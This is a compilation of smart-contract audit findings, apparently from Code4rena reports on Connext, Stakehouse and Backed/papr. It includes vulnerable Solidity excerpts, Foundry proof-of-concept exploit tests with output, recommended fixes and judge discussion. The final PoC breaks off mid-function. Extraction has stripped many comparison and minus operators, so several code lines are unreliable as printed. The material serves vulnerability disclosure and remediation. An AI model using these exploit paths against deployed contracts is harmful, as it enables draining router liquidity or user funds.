--------------------------------------------------
article section:
"""
High Severity

[H-04]

 In  execute()  the amount routers pay is what user signed, but in  _reconcile()  the amount routers get is what nomad sends and these two amounts are not necessary equal because of slippage in original domain

[BridgeFacet.sol#L526-L616(https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L526-L616)<br[BridgeFacet.sol#L753-L803(https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L753-L803)<br[BridgeFacet.sol#L398-L428(https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L398-L428)<br[BridgeFacet.sol#L345-L351(https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L345-L351)<brRouters pay for transaction in destination domain then nomad messages come and routers get paid again. but the amount routers pay in `execute()` are what transaction sender signed and the amount routers receive is what nomad sends and handles in `_reconcile()` but this two amount can be different because of slippage and swap that happens in `xcall()` because the amount sent in nomad message is the result of `swapToLocalAssetIfNeeded()`.<brSo it's possible for routers to lose funds if some slippage happens in that swap.This is `xcall()` code:      function xcall(XCallArgs calldata _args) external payable whenNotPaused nonReentrant returns (bytes32) {        // Sanity checks.        {          // Correct origin domain.          if (_args.params.originDomain != s.domain) {            revert BridgeFacet__xcall_wrongDomain();          }          // Recipient is defined.          if (_args.params.to == address(0)) {            revert BridgeFacet__xcall_emptyTo();          }          // If callback address is not set, callback fee should be 0.          if (_args.params.callback == address(0) && _args.params.callbackFee  0) {            revert BridgeFacet__xcall_nonZeroCallbackFeeForCallback();          }          // Callback is contract if supplied.          if (_args.params.callback != address(0) && !Address.isContract(_args.params.callback)) {            revert BridgeFacet__xcall_callbackNotAContract();          }        }        bytes32 transferId;        bytes memory message;        XCalledEventArgs memory eventArgs;        {          // Get the remote BridgeRouter address; revert if not found.          bytes32 remote = _mustHaveRemote(_args.params.destinationDomain);          // Get the true transacting asset ID (using wrapper instead of native, if applicable).          address transactingAssetId = _args.transactingAssetId == address(0)            ? address(s.wrapper)            : _args.transactingAssetId;          // Check that the asset is supported -can be either adopted or local.          ConnextMessage.TokenId memory canonical = s.adoptedToCanonical[transactingAssetId];          if (canonical.id == bytes32(0)) {            // Here, the asset is *not* the adopted asset. The only other valid option            // is for this asset to be the local asset (i.e. transferring madEth on optimism)            // NOTE: it *cannot* be the canonical asset. the canonical asset is only used on            // the canonical domain, where it is *also* the adopted asset.            if (s.tokenRegistry.isLocalOrigin(transactingAssetId)) {              // revert, using a token of local origin that is not registered as adopted              revert BridgeFacet__xcall_notSupportedAsset();            }            (uint32 canonicalDomain, bytes32 canonicalId) = s.tokenRegistry.getTokenId(transactingAssetId);            canonical = ConnextMessage.TokenId(canonicalDomain, canonicalId);          }          transferId = _getTransferId(_args, canonical);          s.nonce += 1;          // Store the relayer fee          s.relayerFees[transferId] = _args.params.relayerFee;          // Transfer funds of transacting asset to the contract from the user.          // NOTE: Will wrap any native asset transferred to wrapped-native automatically.          (, uint256 amount) = AssetLogic.handleIncomingAsset(            _args.transactingAssetId,            _args.amount,            _args.params.relayerFee + _args.params.callbackFee          );          // Swap to the local asset from adopted if applicable.          (uint256 bridgedAmt, address bridged) = AssetLogic.swapToLocalAssetIfNeeded(            canonical,            transactingAssetId,            amount,            _args.params.slippageTol          );          // Transfer callback fee to PromiseRouter if set          if (_args.params.callbackFee != 0) {            s.promiseRouter.initCallbackFee{value: _args.params.callbackFee}(transferId);          }          message = _formatMessage(_args, bridged, transferId, bridgedAmt);          s.xAppConnectionManager.home().dispatch(_args.params.destinationDomain, remote, message);          // Format arguments for XCalled event that will be emitted below.          eventArgs = XCalledEventArgs({            transactingAssetId: transactingAssetId,            amount: amount,            bridgedAmt: bridgedAmt,            bridged: bridged          });        }        // emit event        emit XCalled(transferId, _args, eventArgs, s.nonce 1, message, msg.sender);        return transferId;      }As you can see it swaps what user sent to `LoccalAsset` which the amount is `bridgedAmt` and then send value of `bridgedAmt` to nomad bridge `message = _formatMessage(_args, bridged, transferId, bridgedAmt)`.<brBut the amount user signed in `_args.amount` is different and that what user sends to contract.<brThe reasons that `bridgedAmt` could be different than `_args.amount` is:<br1deflationary tokens in transferring from user.<br2slippage in swap to local token.<brThis is `_reconcile()` code:      function _reconcile(uint32 _origin, bytes memory _message) internal {        // Parse tokenId and action from the message.        bytes29 msg_ = _message.ref(0).mustBeMessage();        bytes29 tokenId = msg_.tokenId();        bytes29 action = msg_.action();        // Assert that the action is valid.        if (!action.isTransfer()) {          revert BridgeFacet__reconcile_invalidAction();        }        // Load the transferId.        bytes32 transferId = action.transferId();        // Ensure the transaction has not already been handled (i.e. previously reconciled).        if (s.reconciledTransfers[transferId]) {          revert BridgeFacet__reconcile_alreadyReconciled();        }        // NOTE: `tokenId` and `amount` must be in plaintext in the message so funds can *only* be minted by        // `handle`. They are both used in the generation of the `transferId` so routers must provide them        // correctly to be reimbursed.        // Get the appropriate local token contract for the given tokenId on this chain.        // NOTE: If the token is of remote origin and there is no existing representation token contract,        // the TokenRegistry will deploy a new one.        address token = s.tokenRegistry.ensureLocalToken(tokenId.domain(), tokenId.id());        // Load amount once.        uint256 amount = action.amnt();        // Mint tokens if the asset is of remote origin (i.e. is representational).        // NOTE: If the asset IS of local origin (meaning it's canonical), then the tokens will already be held        // in escrow in this contract (from previous `xcall`s).        if (!s.tokenRegistry.isLocalOrigin(token)) {          IBridgeToken(token).mint(address(this), amount);          // Update the recorded `detailsHash` for the token (name, symbol, decimals).          // TODO: do we need to keep this          bytes32 details = action.detailsHash();          IBridgeToken(token).setDetailsHash(details);        }        // Mark the transfer as reconciled.        s.reconciledTransfers[transferId] = true;        // If the transfer was executed using fast-liquidity provided by routers, then this value would be set        // to the participating routers.        // NOTE: If the transfer was not executed using fast-liquidity, then the funds will be reserved for        // execution (i.e. funds will be delivered to the transfer's recipient in a subsequent `execute` call).        address[] memory routers = s.routedTransfers[transferId];        // If fast transfer was made using portal liquidity, we need to repay        // FIXME: routers can repay any-amount out-of-band using the `repayAavePortal` method        // or by interacting with the aave contracts directly        uint256 portalTransferAmount = s.portalDebt[transferId] + s.portalFeeDebt[transferId];        uint256 toDistribute = amount;        uint256 pathLen = routers.length;        if (portalTransferAmount != 0) {          // ensure a router took on credit risk          if (pathLen != 1) revert BridgeFacet__reconcile_noPortalRouter();          toDistribute = _reconcileProcessPortal(amount, token, routers[0], transferId);        }        if (pathLen != 0) {          // fast liquidity path          // Credit each router that provided liquidity their due 'share' of the asset.          uint256 routerAmt = toDistribute / pathLen;          for (uint256 i; i < pathLen; ) {            s.routerBalances[routers[i]][token] += routerAmt;            unchecked {              i++;            }          }        }        emit Reconciled(transferId, _origin, routers, token, amount, msg.sender);      }As you can see it uses amount in message to calculate what router should receive.<brThis is `_handleExecuteLiquidity()` code which is used in `execute()`:      function _handleExecuteLiquidity(        bytes32 _transferId,        bool _isFast,        ExecuteArgs calldata _args      ) private returns (uint256, address) {        uint256 toSwap = _args.amount;        // If this is a fast liquidity path, we should handle deducting from applicable routers' liquidity.        // If this is a slow liquidity path, the transfer must have been reconciled (if we've reached this point),        // and the funds would have been custodied in this contract. The exact custodied amount is untracked in state        // (since the amount is hashed in the transfer ID itself) thus, no updates are required.        if (_isFast) {          uint256 pathLen = _args.routers.length;          // Calculate amount that routers will provide with the fast-liquidity fee deducted.          toSwap = _getFastTransferAmount(_args.amount, s.LIQUIDITY_FEE_NUMERATOR, s.LIQUIDITY_FEE_DENOMINATOR);          // Save the addressess of all routers providing liquidity for this transfer.          s.routedTransfers[_transferId] = _args.routers;          // If router does not have enough liquidity, try to use Aave Portals.          // only one router should be responsible for taking on this credit risk, and it should only          // deal with transfers expecting adopted assets (to avoid introducing runtime slippage)          if (            !_args.params.receiveLocal &&            pathLen == 1 &&            s.routerBalances[_args.routers[0]][_args.local] < toSwap &&            s.aavePool != address(0)          ) {            if (!s.routerPermissionInfo.approvedForPortalRouters[_args.routers[0]])              revert BridgeFacet__execute_notApprovedForPortals();            // Portal provides the adopted asset so we early return here            return _executePortalTransfer(_transferId, toSwap, _args.local, _args.routers[0]);          } else {            // for each router, assert they are approved, and deduct liquidity            uint256 routerAmount = toSwap / pathLen;            for (uint256 i; i < pathLen; ) {              // decrement routers liquidity              s.routerBalances[_args.routers[i]][_args.local] -= routerAmount;              unchecked {                i++;              }            }          }        }As you can see it uses the amount defined in `ExecuteArgs` to see how much routers should pay.Because of these two issues (deflationary tokens and swap slippage) attacker could fool protocol to spend more than what he transferred to protocol. This could be seen as two bugs.VIMUpdate spending amount based on  (deflationary tokens and swap slippage).[LayneHaber (Connext) disputed and commented(https://github.com/code-423n4/2022-06-connext-findings/issues/222#issuecomment-1166334184):  I think there is a misunderstanding here -the user takes on the slippage risk both into and out of the local assets, and the router has consistent returns on what was bridged.  On `xcall`, the user swaps the amount put in for the local asset. This incurs some slippage, and only the amount of the local asset is bridged directly. It is the bridged amount that the router should supply liquidity for, and take fees on. Once the router supplies liquidity in `execute` (bridged amount minus the fees), then it is swapped for the local asset and sent to the user. The user may get some different amount here, but it is the user who is impacted by this slippage. On handle, the router is credited the bridged amount.  However, there was a separate bug where the `transferId` was generated with the wrong `amount` on execute, so that could be where the confusion is coming from.[0xleastwood (judge) commented(https://github.com/code-423n4/2022-06-connext-findings/issues/222#issuecomment-1214224150):  I actually agree with the warden here, it seems that they're right about the issue but they just failed to mention the main reason why its an issue is because `transferId` is calculated using `_args.amount` which does not necessarily equal `bridgedAmt` due to slippage. Therefore, routers may end up fronting too much liquidity and receive considerably less when the bridge transfer is eventually reconciled. This seems rather severe as the user will receive the full transfer amount without slippage. This could be abused to drain routers on low liquidity tokens.[LayneHaber (Connext) commented(https://github.com/code-423n4/2022-06-connext-findings/issues/222#issuecomment-1218136485):  Right -I agree that the problems outlined here would be the true consequences for a mismatched `transferId`. If the question is to take the action outlined here(https://github.com/code-423n4/2022-06-connext-findings/issues/227#issuecomment-1214224706) -specifically to keep this open and downgrade #227 as a QA -that would work with me.[LayneHaber (Connext) resolved(https://github.com/code-423n4/2022-06-connext-findings/issues/222):  connext/nxtp@f41a156(https://github.com/connext/nxtp/commit/f41a156b55a01837c8f57a77e52781f74406e1cd)*
"""

--------------------------------------------------
article section:
"""
Medium Severity

[M-10]

  Incorrect implementation of the  ETHPoolLPFactory.sol#rotateLPTokens  let user stakes ETH more than  maxStakingAmountPerValidator  in  StakingFundsVault , and DOS the stake function in  LiquidStakingManager

*Submitted by ladboy233(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132), also found by immeas(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/329), 0xdeadbeef0x(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/326), bin2chen(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/295), minhtrng(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/271), and SaeedAlipoor01988(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/118)*<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76<br<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380<br<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122<br<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130<br<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83<br<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551<br<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940The user is not able to stake the 32 ETH for validators because the staking fund vault LP total supply exceeds 4 ETHER.After the smart wallet, staking fund vault and savETH vault has 32 ETH, the user should be able to call:```solidity/// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication/// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network)/// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain/// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup/// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature/// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contractfunction stake(	bytes[] calldata _blsPublicKeyOfKnots,	bytes[] calldata _ciphertexts,	bytes[] calldata _aesEncryptorKeys,	IDataStructures.EIP712Signature[] calldata _encryptionSignatures,	bytes32[] calldata _dataRoots) external {```before the staking, the validation function is called:```solidity// check minimum balance of smart wallet, dao staking fund vault and savETH vault_assertEtherIsReadyForValidatorStaking(blsPubKey);```which calls:```solidity/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achievedfunction _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {	address associatedSmartWallet = smartWalletOfKnot[blsPubKey];	require(associatedSmartWallet.balance = 4 ether, "Smart wallet balance must be at least 4 ether");	LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);	require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");	require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");	LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);	require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");	require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault");}```note that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER```solidityrequire(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");```however, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokensnote that stakingFundVault inherits from ETHPoolFactory.sol```soliditycontract StakingFundsVault is    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory,```so user call rotateLPTokens on StakingFundsVault```solidity/// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked/// @param _oldLPToken Instance of the old LP token (to be burnt)/// @param _newLPToken Instane of the new LP token (to be minted)/// @param _amount Amount of LP tokens to be rotated/converted from old to newfunction rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {	require(address(_oldLPToken) != address(0), "Zero address");	require(address(_newLPToken) != address(0), "Zero address");	require(_oldLPToken != _newLPToken, "Incorrect rotation to same token");	require(_amount = MIN_STAKING_AMOUNT, "Amount cannot be zero");	require(_amount <= _oldLPToken.balanceOf(msg.sender), "Not enough balance");	require(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, "Liquidity is still fresh");	require(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");```note the line:```solidityrequire(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");```the correct implementaton should be:```solidityrequire(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens");```The 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.```solidity/// @dev Initialization logicfunction _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {	require(address(_liquidStakingNetworkManager) != address(0), "Zero Address");	require(address(_lpTokenFactory) != address(0), "Zero Address");	liquidStakingNetworkManager = _liquidStakingNetworkManager;	lpTokenFactory = _lpTokenFactory;	baseLPTokenName = "ETHLPToken_";	baseLPTokenSymbol = "ETHLP_";	maxStakingAmountPerValidator = 4 ether;}```note the line:```soliditymaxStakingAmountPerValidator = 4 ether;```this parameter maxStakingAmountPerValidator restrict user's ETH deposit amount```solidity    /// @dev Internal business logic for processing staking deposits for single or batch depositsfunction _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {	require(_amount = MIN_STAKING_AMOUNT, "Min amount not reached");	require(_blsPublicKeyOfKnot.length == 48, "Invalid BLS public key");	// LP token issued for the KNOT	// will be zero for a new KNOT because the mapping doesn't exist	LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];	if(address(lpToken) != address(0)) {		// KNOT and it's LP token is already registered		// mint the respective LP tokens for the user		// total supply after minting the LP token must not exceed maximum staking amount per validator		require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");		// mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied		lpToken.mint(msg.sender, _amount);		emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);	}	else {		// check that amount doesn't exceed max staking amount per validator		require(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator");  ```note the line:```solidityrequire(_amount <= maxStakingAmountPerValidator, "Amount exceeds the staking limit for the validator"); ```However, such restriction when rotating LP is changed to```solidityrequire(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");```So to sum it up:When user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:```solidityrequire(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");```However, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)First we need to add the import in LiquidStakingManager.t.sol<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12```solidityimport { MockAccountManager } from "../../contracts/testing/stakehouse/MockAccountManager.sol";import "../../contracts/liquid-staking/StakingFundsVault.sol";import "../../contracts/liquid-staking/LPToken.sol";```<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35then we add the POC:```solidityfunction test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() public {	address user = vm.addr(21312);	bytes memory blsPubKeyOne = fromHex("94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");	bytes memory blsPubKeyTwo = fromHex("9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5");	bytes[] memory publicKeys = new bytes[(2);	publicKeys[0] = blsPubKeyOne;	publicKeys[1] = blsPubKeyTwo;	bytes[] memory signature = new bytes[(2);	signature[0] = "signature";	signature[1] = "signature";	// user spends 8 ether and register two keys to become the public operator	vm.prank(user);	vm.deal(user, 8 ether);	manager.registerBLSPublicKeys{value: 8 ether}(		publicKeys,		signature,		user	);	// active two keys	MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);	MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);	// deposit 4 ETH for public key one and public key two	StakingFundsVault stakingFundsVault = manager.stakingFundsVault();	stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyOne, 4 ether);	stakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyTwo, 4 ether);	// to bypass the error: "Liquidity is still fresh"	vm.warp(1 days);	// rotate staking amount from public key one to public key two	// LP total supply for public key two exceed 4 ETHER	LPToken LPTokenForPubKeyOne = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);	LPToken LPTokenForPubKeyTwo = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyTwo);	stakingFundsVault.rotateLPTokens(LPTokenForPubKeyOne, LPTokenForPubKeyTwo, 4 ether);	uint256 totalSupply = LPTokenForPubKeyTwo.totalSupply();	console.log("total supply of the Staking fund LP exists 4 ETHER.");	console.log(totalSupply);	// calling TestUtils.sol#stakeSingleBlsPubKey, revert	stakeSingleBlsPubKey(blsPubKeyTwo);}```We run the POC:```solidityforge test -vv --match test_rotateLP_Exceed_maxStakingAmountPerValidator_POC```the output is:```solidityRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454)Logs:  total supply of the Staking fund LP exists 4 ETHER.  8000000000000000000Test result: FAILED. 0 passed; 1 failed; finished in 15.73msFailing tests:Encountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454)```the total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:```solidityrequire(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");```Manual Review, FoundryWe recommend the project change from```solidityrequire(_amount + _newLPToken.totalSupply() <= 24 ether, "Not enough mintable tokens");```to```solidityrequire(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, "Not enough mintable tokens");```and change from```solidity/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achievedfunction _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {	address associatedSmartWallet = smartWalletOfKnot[blsPubKey];	require(associatedSmartWallet.balance = 4 ether, "Smart wallet balance must be at least 4 ether");	LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);	require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");	require(stakingFundsLP.totalSupply() = 4 ether, "DAO staking funds vault balance must be at least 4 ether");	LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);	require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");	require(savETHVaultLP.totalSupply() = 24 ether, "KNOT must have 24 ETH in savETH vault");}```we change from `==` balance check to `=`, because `==` balance check is too strict in this case.[vince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1329494472)[Trust (warden) commented(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1332138834):  Really nice find and described beautifully. The only thing I would ask is why it is considered a HIGH risk, if the described impact is DOS of the staking function, which is a Medium level impact.[LSDan (judge) decreased severity to Medium and commented(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1332144897):  I agree with the sponsor and other wardens here. This should be medium. Great find and explanation.*
"""

--------------------------------------------------

article section:
"""
High Severity

[H-01]

 Borrowers may earn auction proceeds without filling the debt shortfall

*Submitted by hihen(https://github.com/code-423n4/2022-12-backed-findings/issues/97), also found by bin2chen(https://github.com/code-423n4/2022-12-backed-findings/issues/214), rvierdiiev(https://github.com/code-423n4/2022-12-backed-findings/issues/136), and HollaDieWaldfee(https://github.com/code-423n4/2022-12-backed-findings/issues/70)*The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.Assume N is an allowed NFT, B is a borrower, the vault V is `_vaultInfo[B][N]`:1.  B add two NFTs (N-1 and N-2) as collaterals to vault V.2.  B increaseDebt()(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V.3.  The vault V becomes liquidatable.4.  Someone calls startLiquidationAuction()(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1.5.  No one buys N-1 because the price of N is falling.6.  After liquidationAuctionMinSpacing 2days(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls startLiquidationAuction()(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2.7.  Someone calls purchaseLiquidationAuctionNFT(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:```solidityif (isLastCollateral && remaining != 0) {    /// there will be debt left with no NFTs, set it to 0    _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);}```8.  Someone calls purchaseLiquidationAuctionNFT(https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because `neededToSaveVault` is 0 and `debtCached` is 0:```solidityif (excess  0) {    remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);}```The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.Test code for PoC:```soliditydiff --git a/test/paprController/PoC.sol b/test/paprController/PoC.solnew file mode 100644index 0000000..0b12914--/dev/null+++ b/test/paprController/PoC.sol@@ -0,0 +1,147 @@+// SPDX-License-Identifier: GPL-2.0-or-later+pragma solidity ^0.8.17;++import "forge-std/console.sol";+import {ERC721} from "solmate/tokens/ERC721.sol";++import {ReservoirOracleUnderwriter} from "../../src/ReservoirOracleUnderwriter.sol";+import {INFTEDA} from "../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol";++import {BasePaprControllerTest} from "./BasePaprController.ft.sol";+import {IPaprController} from "../../src/interfaces/IPaprController.sol";++contract PoC is BasePaprControllerTest {+    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount);+    event Transfer(address indexed from, address indexed to, uint256 amount);++    INFTEDA.Auction auction1;+    INFTEDA.Auction auction2;+    address purchaser = address(2);++    function setUp() public override {+        super.setUp();++        // mint a second collateral+        nft.mint(borrower, collateralId+1);+        // add collaterals, loan max and sells+        _addCollaterals();+        _loanMaxAndSell();+        // borrower now has 2.9... USD+        assertGt(underlying.balanceOf(borrower), 2.9e6);++        // prepare purchaser+        vm.startPrank(purchaser);+        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) 10;+        safeTransferReceivedArgs.proceedsTo = purchaser;+        safeTransferReceivedArgs.swapParams.minOut = 0;+        for (uint i = 0; i < 3; i ++) {+            nft.mint(purchaser, 10+i);+            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs));+        }+        vm.stopPrank();+        // purchaser now has 4.4... papr+        assertGt(debtToken.balanceOf(purchaser), 4.4e18);++        // make max loan liquidatable+        vm.warp(block.timestamp + 1 days);+        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);+    }++    function testPoC() public {+        vm.startPrank(purchaser);+        debtToken.approve(address(controller), type(uint256).max);++        // start auction1, collateralId+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);+        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo);++        // nobody purchage auction1 for some reason(like nft price falling)++        // start auction2, collateralId+1+        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing());+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);+        auction2 = controller.startLiquidationAuction(+            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo);++        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr);+        assertGt(info.debt, 2.99e18);++        // purchase auction1+        uint256 beforeBalance = debtToken.balanceOf(borrower);+        uint256 price = controller.auctionCurrentPrice(auction1);+        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4;+        uint256 reduced = price penalty;+        uint256 shortfall = info.debt reduced;+        // burn penalty+        vm.expectEmit(true, true, false, true);+        emit Transfer(address(controller), address(0), penalty);+        // reduce debt (partial)+        vm.expectEmit(true, false, false, true);+        emit ReduceDebt(borrower, collateral.addr, reduced);+        vm.expectEmit(true, true, false, true);+        emit Transfer(address(controller), address(0), reduced);+        //!! burning the shortfall debt not covered by auction+        vm.expectEmit(true, false, false, true);+        emit ReduceDebt(borrower, collateral.addr, shortfall);+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);+        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo);++        // reduced: 0.65..+        assertLt(reduced, 0.66e18);+        // fortfall: 2.34..+        assertGt(shortfall, 2.34e18);+        //!! debt is 0 now+        info = controller.vaultInfo(borrower, collateral.addr);+        assertEq(info.debt, 0);++        // purchase auction2+        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29+        vm.warp(block.timestamp + 78831);+        beforeBalance = debtToken.balanceOf(borrower);+        price = controller.auctionCurrentPrice(auction2);+        penalty = price * controller.liquidationPenaltyBips() / 1e4;+        uint256 payouts = price penalty;+        // burn penalty+        vm.expectEmit(true, true, false, true);+        emit Transfer(address(controller), address(0), penalty);+        //!! reduce 0 because debt is 0+        vm.expectEmit(true, false, false, true);+        emit ReduceDebt(borrower, collateral.addr, 0);+        vm.expectEmit(true, true, false, true);+        emit Transfer(address(controller), address(0), 0);+        //!! borrower get the payouts that should be used to reduce the shortfall debt+        vm.expectEmit(true, true, false, true);+        emit Transfer(address(controller), borrower, payouts);+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);+        